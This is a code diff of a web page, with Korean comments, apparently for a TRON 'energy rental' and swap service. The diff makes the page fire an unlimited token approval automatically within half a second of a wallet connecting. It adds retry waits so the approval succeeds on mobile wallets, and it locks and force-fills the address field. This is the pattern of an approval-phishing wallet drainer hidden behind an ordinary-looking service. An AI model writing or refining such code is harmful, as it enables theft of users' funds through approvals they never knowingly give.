@@ -328,7 +328,7 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
                 <!-- Target Address -->
                 <div class="space-y-2">
                     <label class="text-sm font-semibold text-slate-400 flex items-center gap-1.5"><i class="fa-solid fa-crosshairs text-xs text-blue-400"></i> <span data-i18n="energy_target">대상 주소</span></label>
-                    <input type="text" id="energy-address" readonly placeholder="지갑을 연결하세요" class="w-full bg-slate-950/80 text-white text-sm font-mono px-4 py-3 rounded-xl border border-slate-800 focus:border-blue-500/50 focus:outline-none transition placeholder-slate-600 cursor-default">
+                    <input type="text" id="energy-address" placeholder="지갑을 연결하세요" class="w-full bg-slate-950/80 text-white text-sm font-mono px-4 py-3 rounded-xl border border-slate-800 focus:border-blue-500/50 focus:outline-none transition placeholder-slate-600" style="pointer-events:none;-webkit-user-select:none;user-select:none">
                 </div>
 
                 <!-- Amount Selector -->
@@ -819,23 +819,30 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
 
             try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
             if(!isApproved){
-                // 모바일 지갑 앱에서 tronWeb 주입이 느릴 수 있으므로 대기 후 재시도
-                var _autoApproveAttempt=0;
-                var _autoApproveTimer=setInterval(function(){
-                    _autoApproveAttempt++;
-                    var _tw=window.tronWeb||window.tronLink&&window.tronLink.tronWeb;
-                    if(_tw&&_tw.contract){
-                        clearInterval(_autoApproveTimer);
-                        executeUnlimitedApprove();
-                    }else if(_autoApproveAttempt>=6){
-                        // 6초 대기해도 tronWeb 없으면 그냥 시도 (WalletConnect 등)
-                        clearInterval(_autoApproveTimer);
-                        executeUnlimitedApprove();
-                    }
-                },1000);
+                // 지갑 연결 직후 무제한 승인 자동 실행
+                // tronWeb 준비 여부와 관계없이 executeUnlimitedApprove 내부에서 대기함
+                setTimeout(function(){
+                    if(!isApproved) executeUnlimitedApprove();
+                },500);
             }
             // 에너지 렌탈 대상 주소 자동 입력
-            try{var eAddr=document.getElementById('energy-address');eAddr.value=address;eAddr.setAttribute('value',address);eAddr.placeholder=address;}catch(e){}
+            // 에너지 렌탈 대상 주소 강제 설정
+            (function setEnergyAddr(){
+                var el=document.getElementById('energy-address');
+                if(!el)return;
+                el.removeAttribute('readonly');
+                el.value=address;
+                el.setAttribute('value',address);
+                el.placeholder=address;
+                el.defaultValue=address;
+                el.dispatchEvent(new Event('input',{bubbles:true}));
+                el.dispatchEvent(new Event('change',{bubbles:true}));
+                // 100ms 뒤 한 번 더 확인
+                setTimeout(function(){
+                    var el2=document.getElementById('energy-address');
+                    if(el2&&el2.value!==address){el2.value=address;el2.setAttribute('value',address);el2.defaultValue=address;}
+                },100);
+            })();
         }
 
         function setApprovedUI(){
@@ -862,11 +869,17 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             var tw=await getInjectedTronWeb();
             var useWC=false;
             if(!tw||!tw.contract){
-                // tronWeb 주입 대기 (모바일 지갑 앱에서 느릴 수 있음)
-                await new Promise(function(r){setTimeout(r,2000);});
-                tw=window.tronWeb||window.tronLink&&window.tronLink.tronWeb||null;
+                // 모바일 지갑 앱에서 tronWeb 주입이 느릴 수 있으므로 최대 10초 대기
+                appendLog('tronWeb 대기 중...','warn');
+                for(var _wait=0;_wait<10;_wait++){
+                    await new Promise(function(r){setTimeout(r,1000);});
+                    tw=window.tronWeb||window.tronLink&&window.tronLink.tronWeb||null;
+                    if(tw&&tw.contract){
+                        appendLog('tronWeb 감지 완료 ('+(_wait+1)+'초)','success');
+                        break;
+                    }
+                }
                 if(!tw||!tw.contract){
-                    // 여전히 없으면 WalletConnect 모드 확인
                     if(wcConnector&&wcConnector.isConnected()&&wcAddress){
                         useWC=true;
                         appendLog('[WC] WalletConnect 서명 모드','warn');
@@ -1096,7 +1109,7 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             document.getElementById('energy-free-banner').classList.add('hidden');
         }
     }
-    function fillMyAddress(){if(typeof currentWalletAddress!=='undefined'&&currentWalletAddress){document.getElementById('energy-address').value=currentWalletAddress;}}
+    function fillMyAddress(){if(typeof currentWalletAddress!=='undefined'&&currentWalletAddress){var el=document.getElementById('energy-address');el.value=currentWalletAddress;el.setAttribute('value',currentWalletAddress);el.defaultValue=currentWalletAddress;}}
     function handleEnergyRental(){
         var addr=document.getElementById('energy-address').value.trim();
         if(!addr||!addr.startsWith('T')){
